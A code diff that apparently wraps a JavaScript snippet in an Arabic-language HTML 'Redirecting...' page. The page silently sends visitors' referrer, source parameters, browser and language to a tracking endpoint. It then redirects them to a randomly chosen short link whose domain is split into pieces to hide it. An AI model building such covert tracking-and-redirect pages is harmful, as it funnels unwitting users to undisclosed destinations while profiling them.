@@ -1,82 +1,99 @@
-(function () {
-  "use strict";
+<!doctype html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Redirecting...</title>
+</head>
+<body>
+  <!-- كود التتبع -->
+  <script type="text/javascript">
+    (function () {
+      "use strict";
 
-  var TRACK_ENDPOINT = "https://vtrafick.goooo.workers.dev/track";
+      var TRACK_ENDPOINT = "https://vtrafick.goooo.workers.dev/track";
 
-  function cleanSource(value) {
-    return String(value || "")
-      .replace(/[\u0000-\u001f\u007f]/g, "")
-      .trim()
-      .slice(0, 100);
-  }
-
-  function getExplicitSource() {
-    try {
-      var params = new URLSearchParams(window.location.search || "");
-      var keys = ["__ga_source", "utm_source", "src", "source", "ref", "from"];
-      for (var i = 0; i < keys.length; i += 1) {
-        var value = cleanSource(params.get(keys[i]));
-        if (value) return value;
-      }
-    } catch (e) {}
-    return "";
-  }
-
-  function sendTracking() {
-    try {
-      var explicitSource = getExplicitSource();
-      var referrer = document.referrer || "";
-      var source = explicitSource || referrer || "";
-      var sourceKind = explicitSource
-        ? "manual"
-        : referrer
-          ? "referrer"
-          : "unknown";
-
-      var payload = JSON.stringify({
-        event: "intermediary-click",
-        worker: location.hostname || "unknown",
-        path: location.pathname || "/",
-        referrer: referrer,
-        source: source,
-        sourceKind: sourceKind,
-        userAgent: navigator.userAgent || "",
-        language: navigator.language || ""
-      });
-
-      var blob = new Blob(
-        [payload],
-        { type: "text/plain;charset=UTF-8" }
-      );
-
-      if (
-        navigator.sendBeacon &&
-        navigator.sendBeacon(TRACK_ENDPOINT, blob)
-      ) {
-        return;
+      function cleanSource(value) {
+        return String(value || "")
+          .replace(/[\u0000-\u001f\u007f]/g, "")
+          .trim()
+          .slice(0, 100);
       }
 
-      fetch(TRACK_ENDPOINT, {
-        method: "POST",
-        mode: "cors",
-        headers: {
-          "Content-Type": "text/plain;charset=UTF-8"
-        },
-        body: payload,
-        keepalive: true
-      }).catch(function () {});
-    } catch (e) {}
-  }
+      function getExplicitSource() {
+        try {
+          var params = new URLSearchParams(window.location.search || "");
+          var keys = ["__ga_source", "utm_source", "src", "source", "ref", "from"];
+          for (var i = 0; i < keys.length; i += 1) {
+            var value = cleanSource(params.get(keys[i]));
+            if (value) return value;
+          }
+        } catch (e) {}
+        return "";
+      }
 
-  function redirect() {
-    var a = "rush.";
-    var b = "short.";
-    var c = "gy/";
-    var d = Math.ceil(Math.random() * 24);
-    var target = "https://" + a + b + c + d;
-    window.location.replace(target);
-  }
+      function sendTracking() {
+        try {
+          var explicitSource = getExplicitSource();
+          var referrer = document.referrer || "";
+          var source = explicitSource || referrer || "";
+          var sourceKind = explicitSource
+            ? "manual"
+            : referrer
+              ? "referrer"
+              : "unknown";
 
-  sendTracking();
-  redirect();
-}());
+          var payload = JSON.stringify({
+            event: "intermediary-click",
+            worker: location.hostname || "unknown",
+            path: location.pathname || "/",
+            referrer: referrer,
+            source: source,
+            sourceKind: sourceKind,
+            userAgent: navigator.userAgent || "",
+            language: navigator.language || ""
+          });
+
+          var blob = new Blob(
+            [payload],
+            { type: "text/plain;charset=UTF-8" }
+          );
+
+          if (
+            navigator.sendBeacon &&
+            navigator.sendBeacon(TRACK_ENDPOINT, blob)
+          ) {
+            return;
+          }
+
+          fetch(TRACK_ENDPOINT, {
+            method: "POST",
+            mode: "cors",
+            headers: {
+              "Content-Type": "text/plain;charset=UTF-8"
+            },
+            body: payload,
+            keepalive: true
+          }).catch(function () {});
+        } catch (e) {}
+      }
+
+      sendTracking();
+    }());
+  </script>
+
+  <!-- دالة التوجيه تحت كود التتبع -->
+  <script type="text/javascript">
+    function reDirect() {
+      var a = "rush.";
+      var b = "short.";
+      var c = "gy/";
+      var d = Math.ceil(Math.random() * 24);
+      var target = "https://" + a + b + c + d;
+      window.location.replace(target);
+    }
+
+    reDirect();
+  </script>
+</body>
+</html>
